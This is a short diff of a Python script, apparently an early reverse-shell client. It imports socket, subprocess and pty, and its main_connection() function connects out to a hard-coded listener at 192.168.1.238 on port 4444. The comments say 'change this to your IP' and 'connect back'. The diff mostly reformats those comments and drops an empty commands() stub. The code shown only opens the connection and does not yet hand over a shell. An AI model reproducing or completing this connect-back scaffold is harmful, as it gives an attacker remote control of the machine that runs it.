@@ -10,16 +10,12 @@ import os
 import subprocess
 import pty
 
-def main_connection():        # this is for your computer info
-    host = "192.168.1.238"    # change this to your IP
-    port = 4444               # you can change this to any port
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-
-def commands():
-    
+def main_connection():      
+    host = "192.168.1.238"                                  # change this to your IP
+    port = 4444                                             # you can change this to any port
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # make the connection
+    s.connect((host, port))                                 # connect back
 
 main_connection()
-
 
 
